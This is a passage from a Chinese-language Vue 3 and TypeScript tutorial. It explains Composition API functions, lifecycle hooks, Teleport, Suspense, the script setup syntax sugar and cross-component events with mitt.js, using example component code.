\u0026lt;HelloWorld msg=\u0026#34;Welcome to Your Vue.js + TypeScript App\u0026#34; /\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#34;ts\u0026#34;\u0026gt; // 這裡可以書寫 TS 程式碼 // defineComponent 函式，目的是定義一個元件，內部可以傳入一個配置物件 import { defineComponent } from \u0026#39;vue\u0026#39;; // 引入子級元件 import HelloWorld from \u0026#39;./components/HelloWorld.vue\u0026#39;; // 暴露出去一個定義好的元件 export default defineComponent({ // 當前元件的名字 name: \u0026#39;App\u0026#39;, // 註冊元件 components: { // 註冊一個子級元件 HelloWorld, }, }); \u0026lt;/script\u0026gt; Composition API 接下來到了重頭戲，Vue3 的招牌特性，Composition API。\n關於 Composition API 這裡有圖解演示，極力推薦。\n圖解 Option API vs Composition API\nComposition API 可以更方便的抽取共通邏輯，但是不要過於在意邏輯程式碼複用，以功能提取程式碼也是一種思路。 順便提一句，Vue3 相容大部分 Vue2 語法，所以在 Vue3 中書寫 Vue2 語法是沒有問題的（廢除的除外），但是既然我們已經升級 Vue3 了，不建議混合使用，除非一些大型特殊專案需要相容兩個版本。\n生命週期鉤子 setup setup 是組合 Composition API 中的入口函式，也是第一個要使用的函式。 setup 只在初始化時執行一次，所有的 Composition API 函式都在此使用。 1 2 3 setup() { console.log(\u0026#39;我執行了\u0026#39;) // 我執行了 }, 可以通過 console.log 看到 setup 是在 beforeCreate 生命週期之前執行的(只執行一次)：\n1 2 3 4 5 6 7 8 9 beforeCreate() { console.log(\u0026#39;beforeCreate執行了\u0026#39;); }, setup() { console.log(\u0026#39;setup執行了\u0026#39;); return {}; }, // setup執行了 // beforeCreate執行了 由此可以推斷出 setup 執行的時候，元件物件還沒有建立，元件實例物件 this 還不可用，此時 this 是 undefined，不能通過 this 來訪問 data、computed、methods、props。 返回物件中的^1.^屬性會與 data 函式返回物件的屬性合併成為元件物件的屬性；^2.^返回物件中的方法會與 methods 中的方法合併成功元件物件的方法。 如果有重名，setup 優先。因為在 setup 中 this 不可用，methods 中可以訪問 setup 提供的屬性和方法，但在 setup 方法中不能訪問 data 和 methods 裡的內容，所以還是不建議混合使用。 setup 函式如果返回物件，物件中的屬性或方法，template 中可以直接使用。 sample.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt;{{number}}\u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; // ... setup() { const number = 18; return { number, }; }, // ... \u0026lt;/script\u0026gt; 注意：setup 不能是一個 async 函式，因為返回值不再是 return 的物件，而是 promise，template 中就不可以使用 return 中返回物件的資料了。\nsetup 的參數(^1.^props, ^2.^context)：\nprops：是一個物件，裡面有父級元件向子級元件傳遞的資料，並且是在子級元件中使用 props 接收到的所有的屬性。 context：上下文物件，可以通過 es6 語法解構 setup(props, {^(a).^attrs, ^(b).^slots, ^(c).^emit})\n\u0026gt; a). attrs：獲取當前元件標籤上所有沒有通過 props 接收的屬性的物件，相當於 this.$attrs。\n\u0026gt; b). slots：包含所有傳入的插槽內容的物件，相當於 this.$slots。\n\u0026gt; c). emit：用來分發自定義事件的函式，相當於 this.$emit。 演示 attrs 和 props： parent.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;template\u0026gt; \u0026lt;child :msg=\u0026#34;msg\u0026#34; msg2=\u0026#39;哈哈哈\u0026#39; /\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#39;ts\u0026#39;\u0026gt; import { defineComponent, ref } from \u0026#39;vue\u0026#39;; // 引入子元件 import Child from \u0026#39;./components/Child.vue\u0026#39;; export default defineComponent({ name: \u0026#39;App\u0026#39;, components: { Child, }, setup() { const msg = ref(\u0026#39;hello,vue3\u0026#39;); return { msg, }; }, }); \u0026lt;/script\u0026gt; children.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;template\u0026gt; \u0026lt;h2\u0026gt;子元件\u0026lt;/h2\u0026gt; \u0026lt;h3\u0026gt;msg:{{ msg }}\u0026lt;/h3\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#39;ts\u0026#39;\u0026gt; import { defineComponent } from \u0026#39;vue\u0026#39;; export default defineComponent({ name: \u0026#39;Child\u0026#39;, props: [\u0026#39;msg\u0026#39;], setup(props, {attrs, slots, emit}) { console.log(\u0026#39;props:\u0026#39;, props); // msg: \u0026#34;hello,vue3\u0026#34; console.log(\u0026#39;attrs:\u0026#39;, attrs); // msg2: \u0026#34;哈哈哈\u0026#34; return {}; }, }); \u0026lt;/script\u0026gt; 演示 emit： parent.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;template\u0026gt; \u0026lt;child @click=\u0026#34;show\u0026#34; /\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#39;ts\u0026#39;\u0026gt; setup() { const show = () =\u0026gt; { console.log(\u0026#39;name:\u0026#39;, \u0026#39;hzw\u0026#39;); }; return { show, }; }, \u0026lt;/script\u0026gt; children.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;template\u0026gt; \u0026lt;button\u0026gt;事件分發\u0026lt;/button\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#39;ts\u0026#39;\u0026gt; import { defineComponent } from \u0026#39;vue\u0026#39;; export default defineComponent({ name: \u0026#39;Child\u0026#39;, setup(props, { emit }) { const emitFn = () =\u0026gt; { emit(\u0026#39;show\u0026#39;); }; return { emitFn, }; }, }); \u0026lt;/script\u0026gt; ref 作用：定義一個響應式的資料(一般用來定義一個基本型別的響應式資料 Undefined、Null、Boolean、Number、String) 語法： 1 const xxx = ref(initValue); 注意：script 中操作資料需要使用 xxx.value 的形式，而 template 中不需要新增 .value 用一個例子來演示，實現一個按鈕，點選可以增加數字：\naddNum.vue 1 2 3 4 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt;{{count}}\u0026lt;/div\u0026gt; \u0026lt;button @click=\u0026#39;updateCount\u0026#39;\u0026gt;增加\u0026lt;/button\u0026gt; \u0026lt;/template\u0026gt; 在 Vue2 中：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;script\u0026gt; // ... data() { return { conunt: 0, }; }, methods: { updateCount() { this.conunt++; }, }, // ... \u0026lt;/script\u0026gt; 在 Vue3 中：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \u0026lt;script\u0026gt; // ... setup() { // ref 用於定義一個響應式的資料，返回的是一個 Ref 物件，物件中有一個 value 屬性 // 如果需要對資料進行操作，需要使用該 Ref 物件的 value 屬性 const count = ref(0); function updateCount() { count.value++; } return { count, updateCount }; }, // ... \u0026lt;/script\u0026gt; 在 Vue2 中我們通過 this.$refs 來獲取 dom 節點，Vue3 中我們通過 ref 來獲取節點。\n首先需要在標籤上新增 ref='xxx'，然後再 setup 中定義一個初始值為 null 的 ref 型別，名字要和標籤的 ref 屬性一致。\n1 const xxx = ref(null) 注意 ：一定要在 setup 的 return 中返回，不然會報錯。\n用一個例子來演示，讓輸入框自動獲取焦點：\nautoFocus.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 \u0026lt;template\u0026gt; \u0026lt;h2\u0026gt;App\u0026lt;/h2\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34;\u0026gt;--- \u0026lt;input type=\u0026#34;text\u0026#34; ref=\u0026#34;inputRef\u0026#34;\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#34;ts\u0026#34;\u0026gt; import { onMounted, ref } from \u0026#39;vue\u0026#39; /* ref獲取元素: 利用 ref 函式獲取元件中的標籤元素 功能需求: 讓輸入框自動獲取焦點 */ export default { setup() { const inputRef = ref\u0026lt;HTMLElement|null\u0026gt;(null) onMounted(() =\u0026gt; { inputRef.value \u0026amp;\u0026amp; inputRef.value.focus() }) return { inputRef } }, } \u0026lt;/script\u0026gt; reactive 作用：定義多個數據的響應式，接收一個普通物件然後返回該普通物件的響應式代理器物件(Proxy)，響應式轉換是\u0026quot;深層的\u0026quot;：會影響物件內部所有巢狀的屬性，所有的資料都是響應式的。 語法： 1 const proxy = reactive(obj) 程式碼演示： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 \u0026lt;template\u0026gt; \u0026lt;h3\u0026gt;姓名:{{user.name}}\u0026lt;/h3\u0026gt; \u0026lt;h3\u0026gt;年齡:{{user.age}}\u0026lt;/h3\u0026gt; \u0026lt;h3\u0026gt;wife:{{user.wife}}\u0026lt;/h3\u0026gt; \u0026lt;button @click=\u0026#34;updateUser\u0026#34;\u0026gt;更新\u0026lt;/button\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; // ... setup() { const user = reactive({ name: \u0026#39;hzw\u0026#39;, age: 18, wife: { name: \u0026#39;xioaohong\u0026#39;, age: 18, books: [\u0026#39;紅寶書\u0026#39;, \u0026#39;設計模式\u0026#39;, \u0026#39;演算法與資料結構\u0026#39;], }, }); const updateUser = () =\u0026gt; { user.name = \u0026#39;小紅\u0026#39;; user.age += 2; user.wife.books[0] = \u0026#39;金瓶梅\u0026#39;; }; return { user, updateUser, }; }, // ... \u0026lt;/script\u0026gt; computed 與 Vue2 中的 computed 配置功能一致，返回的是一個 ref 型別的物件。 computed 的函式中如果只傳入一個箭頭函式 表示的是 get 操作： 1 2 3 4 5 6 7 8 9 10 11 12 13 import { computed } from \u0026#39;vue\u0026#39;; const user = reactive({ firstName: \u0026#39;韓\u0026#39;, lastName: \u0026#39;志偉\u0026#39;, }); const fullName1 = computed(() =\u0026gt; { return user.firstName + user.lastName; }); return { user, fullName1, }; computed 的函式中可以傳入一個物件，可以包含 set 和 get 函式，進行讀取和修改的操作： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 import { computed } from \u0026#39;vue\u0026#39;; const user = reactive({ firstName: \u0026#39;韓\u0026#39;, lastName: \u0026#39;志偉\u0026#39;, }); const fullName2 = computed({ get() { return user.firstName + \u0026#39;_\u0026#39; + user.lastName; }, set(val: string) { const names = val.split(\u0026#39;_\u0026#39;); user.firstName = names[0]; user.lastName = names[1]; }, }); return { user, fullName2, }; watch 與 Vue2 中的 watch 配置功能一致。 作用：監視指定的一個或多個響應式資料，一旦資料變化，就自動執行監視回撥。 語法：watch(要監聽的資料, 回調函式, 配置) 預設初始時不執行回調，但可以通過配置的 immediate 為 true，來指定初始時立即執行第一次。 通過配置的 deep 為 true，來指定深度監視。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 import { watch, ref } from \u0026#39;vue\u0026#39;; const user = reactive({ firstName: \u0026#39;韓\u0026#39;, lastName: \u0026#39;志偉\u0026#39;, }); const fullName3 = ref(\u0026#39;\u0026#39;); watch( user, ({ firstName, lastName }) =\u0026gt; { fullName3.value = firstName + \u0026#39;_\u0026#39; + lastName; }, { immediate: true, deep: true } ); return { user, fullName3, }; watch 監聽多個數據，使用陣列。\nwatch 監聽非響應式資料的時候需要使用回調函式的形式。\n1 2 3 4 5 6 7 8 9 10 watch( [ () =\u0026gt; user.firstName, () =\u0026gt; user.lastName, fullName3 ], () =\u0026gt; { console.log(\u0026#39;我執行了\u0026#39;) } ) watchEffect 作用：監視資料發生變化時執行回調，不用直接指定要監視的資料，回調函式中使用的哪些響應式資料就監視哪些響應式資料，預設初始時就會執行第一次，從而可以收集需要監視的資料。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 import { watchEffect, ref } from \u0026#39;vue\u0026#39;; const user = reactive({ firstName: \u0026#39;韓\u0026#39;, lastName: \u0026#39;志偉\u0026#39;, }); const fullName4 = ref(\u0026#39;\u0026#39;); watchEffect(() =\u0026gt; { fullName4.value = user.firstName + \u0026#39;_\u0026#39; + user.lastName; }); return { user, fullName4, }; // watchEffect可以實現計算屬性set方法 watchEffect(() =\u0026gt; { const names = fullName3.value.split(\u0026#39;_\u0026#39;); user.firstName = names[0]; user.lastName = names[1]; }); 生命週期對比：\n注意：3.0 中的生命週期鉤子要比 2.X 中相同生命週期的鉤子要快。 Composition API 還新增了以下用於除錯的鉤子函式，但是不怎麼常用：onRenderTracked、onRenderTriggered。 程式碼演示： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 setup() { onBeforeMount(() =\u0026gt; { console.log(\u0026#39;--onBeforeMount\u0026#39;) }) onMounted(() =\u0026gt; { console.log(\u0026#39;--onMounted\u0026#39;) }) onBeforeUpdate(() =\u0026gt; { console.log(\u0026#39;--onBeforeUpdate\u0026#39;) }) onUpdated(() =\u0026gt; { console.log(\u0026#39;--onUpdated\u0026#39;) }) onBeforeUnmount(() =\u0026gt; { console.log(\u0026#39;--onBeforeUnmount\u0026#39;) }) onUnmounted(() =\u0026gt; { console.log(\u0026#39;--onUnmounted\u0026#39;) }) } toRefs 作用：把一個響應式物件轉換成普通物件，該普通物件的每個屬性都是一個 ref。 應用：我們使用 reactive 建立的物件，如果想在模板中使用，就必須得使用 xxx.xxx 的形式，如果大量用到的話還是很麻煩的，但是使用 es6 解構以後，會失去響應式，那麼 toRefs 的作用就體現在這，利用 toRefs 可以將一個響應式 reactive 物件的所有原始屬性轉換為響應式的 ref 屬性。當然小夥伴們可以自行開發更多應用場景。 程式碼演示： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; name:{{name}} \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#39;ts\u0026#39;\u0026gt; import { defineComponent, reactive, toRefs } from \u0026#39;vue\u0026#39;; export default defineComponent({ name: \u0026#39;\u0026#39;, setup() { const state = reactive({ name: \u0026#39;hzw\u0026#39;, }); const state2 = toRefs(state); setInterval(() =\u0026gt; { state.name += \u0026#39;===\u0026#39;; }, 1000); return { // 通過 toRefs 返回的物件，解構出來的屬性也是響應式的 ...state2, }; }, }); \u0026lt;/script\u0026gt; provide 與 inject 作用：實現跨層級元件(祖孫)間通訊。 程式碼演示： parent.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 \u0026lt;template\u0026gt; \u0026lt;h1\u0026gt;父元件\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;當前顏色: {{color}}\u0026lt;/p\u0026gt; \u0026lt;button @click=\u0026#34;color=\u0026#39;red\u0026#39;\u0026#34;\u0026gt;紅\u0026lt;/button\u0026gt; \u0026lt;button @click=\u0026#34;color=\u0026#39;yellow\u0026#39;\u0026#34;\u0026gt;黃\u0026lt;/button\u0026gt; \u0026lt;button @click=\u0026#34;color=\u0026#39;blue\u0026#39;\u0026#34;\u0026gt;藍\u0026lt;/button\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;Son /\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#34;ts\u0026#34;\u0026gt; import { provide, ref } from \u0026#39;vue\u0026#39; import Son from \u0026#39;./son.vue\u0026#39; export default { name: \u0026#39;ProvideInject\u0026#39;, components: { Son }, setup() { const color = ref(\u0026#39;red\u0026#39;) provide(\u0026#39;color\u0026#39;, color) return { color } } } \u0026lt;/script\u0026gt; son.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;h2\u0026gt;子元件\u0026lt;/h2\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;GrandSon /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#34;ts\u0026#34;\u0026gt; import GrandSon from \u0026#39;./grandson.vue\u0026#39; export default { components: { GrandSon }, } \u0026lt;/script\u0026gt; grandson.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;template\u0026gt; \u0026lt;h3 :style=\u0026#34;{color}\u0026#34;\u0026gt;孫子元件: {{color}}\u0026lt;/h3\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#34;ts\u0026#34;\u0026gt; import { inject } from \u0026#39;vue\u0026#39; export default { setup() { const color = inject(\u0026#39;color\u0026#39;) return { color } } } \u0026lt;/script\u0026gt; 其他特性 Teleport(瞬移) 作用：Teleport 提供了一種乾淨的方法，讓元件的 html 在父元件介面外的特定標籤(很可能是 body )下插入顯示，換句話說就是可以把子元件或者dom節點插入到任何你想插入到的地方去。 語法：使用 to 屬性，引號內使用選擇器。 1 \u0026lt;teleport to=\u0026#34;body\u0026#34;\u0026gt;\u0026lt;/teleport\u0026gt; 程式碼演示： parent.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;father\u0026#34;\u0026gt; \u0026lt;h2\u0026gt;App\u0026lt;/h2\u0026gt; \u0026lt;modal-button\u0026gt;\u0026lt;/modal-button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#34;ts\u0026#34;\u0026gt; import ModalButton from \u0026#39;./components/ModalButton.vue\u0026#39; export default { setup() { return {} }, components: { ModalButton, }, } \u0026lt;/script\u0026gt; children.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;son\u0026#34;\u0026gt; \u0026lt;button @click=\u0026#34;modalOpen = true\u0026#34;\u0026gt; 點我開啟對話方塊 \u0026lt;/button\u0026gt; \u0026lt;teleport to=\u0026#34;body\u0026#34;\u0026gt; \u0026lt;div v-if=\u0026#34;modalOpen\u0026#34; class=\u0026#34;looklook\u0026#34;\u0026gt; 看看我出現在了哪裡 \u0026lt;button @click=\u0026#34;modalOpen = false\u0026#34;\u0026gt; Close \u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/teleport\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; import { ref } from \u0026#39;vue\u0026#39; export default { name: \u0026#39;modal-button\u0026#39;, setup() { const modalOpen = ref(false) return { modalOpen, } }, } \u0026lt;/script\u0026gt; 可以看到在子元件中的 looklook 元素跑到了 body 下面，而之前的位置默認出現了兩行註釋。\nSuspense(不確定的) 作用：它們允許我們的應用程式在等待非同步元件時渲染一些後備內容，可以讓我們建立一個平滑的使用者體驗。 語法： 1 2 3 4 5 6 7 8 9 10 11 \u0026lt;Suspense\u0026gt; \u0026lt;template v-slot:default\u0026gt; \u0026lt;!-- 非同步元件 --\u0026gt; \u0026lt;AsyncComp /\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;template v-slot:fallback\u0026gt; \u0026lt;!-- 後備內容 --\u0026gt; \u0026lt;h1\u0026gt;LOADING...\u0026lt;/h1\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;/Suspense\u0026gt; vue3 中引入非同步元件的方式：\n1 const AsyncComp = defineAsyncComponent(() =\u0026gt; import(\u0026#39;./AsyncComp.vue\u0026#39;)) 程式碼演示： parent.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 \u0026lt;template\u0026gt; \u0026lt;Suspense\u0026gt; \u0026lt;!-- v-slot:defaul 可以簡寫成 #defaul --\u0026gt; \u0026lt;template v-slot:default\u0026gt; \u0026lt;AsyncComp/\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;!-- v-slot:defaul 可以簡寫成 #fallback --\u0026gt; \u0026lt;template v-slot:fallback\u0026gt; \u0026lt;h1\u0026gt;LOADING...\u0026lt;/h1\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;/Suspense\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#34;ts\u0026#34;\u0026gt; import { defineAsyncComponent } from \u0026#39;vue\u0026#39; const AsyncComp = defineAsyncComponent(() =\u0026gt; import(\u0026#39;./AsyncComp.vue\u0026#39;)) export default { setup() { return { } }, components: { AsyncComp, } } \u0026lt;/script\u0026gt; children.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 \u0026lt;template\u0026gt; \u0026lt;h2\u0026gt;AsyncComp22\u0026lt;/h2\u0026gt; \u0026lt;p\u0026gt;{{msg}}\u0026lt;/p\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#34;ts\u0026#34;\u0026gt; export default { name: \u0026#39;AsyncComp\u0026#39;, setup () { return new Promise((resolve, reject) =\u0026gt; { setTimeout(() =\u0026gt; { resolve({ msg: \u0026#39;abc\u0026#39; }) }, 2000) }) } } \u0026lt;/script\u0026gt; 通過下圖可以看到在非同步元件加載出來之前，顯示的是 fallback 中的內容：\n響應式資料的判斷 作用 isRef：檢查一個值是否為一個 ref 物件 isReactive：檢查一個物件是否是由 reactive 建立的響應式代理 isReadonly：檢查一個物件是否是由 readonly 建立的只讀代理 isProxy：檢查一個物件是否是由 reactive 或者 readonly 方法建立的代理 程式碼演示 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 setup() { const state1 = ref(1); console.log(\u0026#39;isref:\u0026#39;, isRef(state1)); // isref: true const state2 = reactive({}); console.log(\u0026#39;isReactive:\u0026#39;, isReactive(state2)); // isReactive: true const state3 = readonly({}); console.log(\u0026#39;isReadonly:\u0026#39;, isReadonly(state3)); // isReadonly: true const state4 = reactive({}); console.log(\u0026#39;isProxy:\u0026#39;, isProxy(state2)); // isProxy: true console.log(\u0026#39;isProxy:\u0026#39;, isProxy(state4)); // isProxy: true return {}; }, 其他不常用特性 還有很多很多不常用的新特性，我在日常開發中是沒有用到的，很多都是用來做優化的，感興趣的小夥伴們自行去官網檢視，或者大佬們可以介紹一下應用場景。\nshallowReactive shallowRef readonly shallowReadonly markRaw customRef \u0026hellip; 語法糖 雖然 Composition API 用起來已經非常方便了，但是我們還是有很煩的地方，比如：\n元件引入了還要註冊。 屬性和方法都要在 setup 函式中返回，有的時候僅一個 return 就十幾行甚至幾十行。 \u0026hellip; 不想寫啊怎麼辦\n好辦， Vue3 官方提供了 script setup 語法糖，只需要在 script 標籤中==新增 setup==，元件只需引入不用註冊，屬性和方法也不用返回，setup 函式也不需要，甚至 export default 都不用寫了，不僅是資料、計算屬性和方法，甚至是自定義指令也可以在我們的 template 中自動獲得。\n但是這麼過癮的語法糖，還是稍微添加了一點點心智負擔，因為沒有了 setup 函式，那麼 props、emit、attrs 怎麼獲取呢，就要介紹一下新的語法了。\nsetup script 語法糖提供了三個新的 API 來供我們使用： ==defineProps==、==defineEmit== 和 ==useContext==。\ndefineProps：用來接收父元件傳來的值 props。 defineEmit：用來宣告觸發的事件表。 useContext：用來獲取元件上下文 context。 程式碼演示 parent.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;h2\u0026gt;我是父元件！\u0026lt;/h2\u0026gt; \u0026lt;Children msg=\u0026#34;hello\u0026#34; @child-click=\u0026#34;handleClick\u0026#34; /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; import Children from \u0026#39;./components/children.vue\u0026#39; const handleClick = (ctx) =\u0026gt; { console.log(ctx) } \u0026lt;/script\u0026gt; children.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;template\u0026gt; \u0026lt;span @click=\u0026#34;sonClick\u0026#34;\u0026gt;msg: {{ props.msg }}\u0026lt;/span\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; import { useContext, defineProps, defineEmit } from \u0026#39;vue\u0026#39; const emit = defineEmit([\u0026#39;child-click\u0026#39;]) const ctx = useContext() const props = defineProps({ msg: String, }) const sonClick = () =\u0026gt; { emit(\u0026#39;child-click\u0026#39;, ctx) } \u0026lt;/script\u0026gt; 我們點選一下子元件：\n可以看到 context 被列印了出來，其中的 attrs、emit、slots、expose 屬性和方法依然可以使用。props 也可以輸出在頁面上，事件也成功派發。\n其他知識點 接下來介紹一下我使用 Vue3 過程中遇到的問題或者小技巧，不全面，想起什麼就寫什麼吧。\nscript setup 語法糖的坑\n這個很多大佬已經在 Vue3 的 github 上提交 Issues 了，或許會在不久的將來修復，但現在還是要注意一下。\n如果在父元件中通過 ref='xxx' 的方法來獲取子元件實例，那麼子元件不可以使用 script setup 語法糖，否則會報錯。\n程式碼演示 parent.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;h2\u0026gt;我是父元件！\u0026lt;/h2\u0026gt; \u0026lt;Child ref=\u0026#39;son\u0026#39; /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; import Child from \u0026#39;./components/children.vue\u0026#39; import { ref } from \u0026#39;vue\u0026#39; const son = ref(null) console.log(\u0026#39; ~ son:\u0026#39;, son) \u0026lt;/script\u0026gt; 子元件先不使用語法糖：\nchildren.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; 我是子元件{{msg}} \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script \u0026gt; import { ref } from \u0026#39;vue\u0026#39; export default { setup() { const msg = ref(\u0026#39;hello\u0026#39;) return { msg, } }, } 現在把子元件換成 script setup 語法糖再來試一試：\nchildren.vue 1 2 3 4 5 6 7 8 9 10 11 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; 我是子元件{{msg}} \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; import { ref } from \u0026#39;vue\u0026#39; const msg = ref(\u0026#39;hello\u0026#39;) \u0026lt;/script\u0026gt; 可以看到現在是獲取不到子元件定義的 msg 屬性的。\nEmit 派發事件可以對引數進行驗證 parent.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;h2\u0026gt;我是父元件！\u0026lt;/h2\u0026gt; \u0026lt;Child @sonClick=\u0026#39;sonClick\u0026#39; /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; import Child from \u0026#39;./components/Child.vue\u0026#39; import { ref } from \u0026#39;vue\u0026#39; const sonClick = (value) =\u0026gt; { console.log(value) } \u0026lt;/script\u0026gt; children.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; 我是子元件{{ msg }} \u0026lt;/div\u0026gt; \u0026lt;button @click=\u0026#34;handleClick(1)\u0026#34;\u0026gt;我是按鈕1\u0026lt;/button\u0026gt; \u0026lt;button @click=\u0026#34;handleClick(2)\u0026#34;\u0026gt;我是按鈕2\u0026lt;/button\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; import { ref } from \u0026#39;vue\u0026#39; export default { name: \u0026#39;\u0026#39;, emits: { sonClick: (value) =\u0026gt; { if (value === 1) { return true } else { return false } }, }, setup(props, { emit }) { const msg = ref(\u0026#39;hello\u0026#39;) const handleClick = (value) =\u0026gt; { emit(\u0026#39;sonClick\u0026#39;, value) } return { msg, handleClick, } }, } \u0026lt;/script\u0026gt; 我們分別點一下按鈕1和按鈕2，可以看到當我們點了按鈕2的時候，控制檯會發出警告，但是程式會繼續執行，還沒想到什麼適合的應用場景，但是要知道這個知識點，小夥伴們可以在這搞事情。\n跨元件通訊 mitt.js Vue2 中怎麼實現跨元件通訊呢？很多人第一想法就是 event bus。但是 Vue3 移除了 $on、$once、$off 導致不能使用這個方法。但是 Vue 官方給大家推薦了 ==mitt.js==，它的原理就是 event bus。\nmitt.js 教學\n程式碼演示 先安裝： 1 npm i mitt -s 然後封裝成一個 hook： mitt.js 1 2 3 4 import mitt from \u0026#39;mitt\u0026#39; const emitter = mitt(); export default emitter; 使用： parent.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;h2\u0026gt;我是父元件！\u0026lt;/h2\u0026gt; \u0026lt;Child1 /\u0026gt; \u0026lt;Child2 /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; import Child1 from \u0026#39;./components/children1.vue\u0026#39; import Child2 from \u0026#39;./components/children2.vue\u0026#39; \u0026lt;/script\u0026gt; children1 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; 我是子元件1 \u0026lt;h1\u0026gt;{{msg}}\u0026lt;/h1\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; import { ref, onUnmounted } from \u0026#39;vue\u0026#39; import emitter from \u0026#39;../mitt\u0026#39; export default { name: \u0026#39;\u0026#39;, setup() { // 初始化 const msg = ref(\u0026#39;hello\u0026#39;) const changeMsg = () =\u0026gt; { msg.value = \u0026#39;world\u0026#39; } // 監聽事件，更新資料 emitter.on(\u0026#39;change-msg\u0026#39;, changeMsg) // 顯式解除安裝 onUnmounted(() 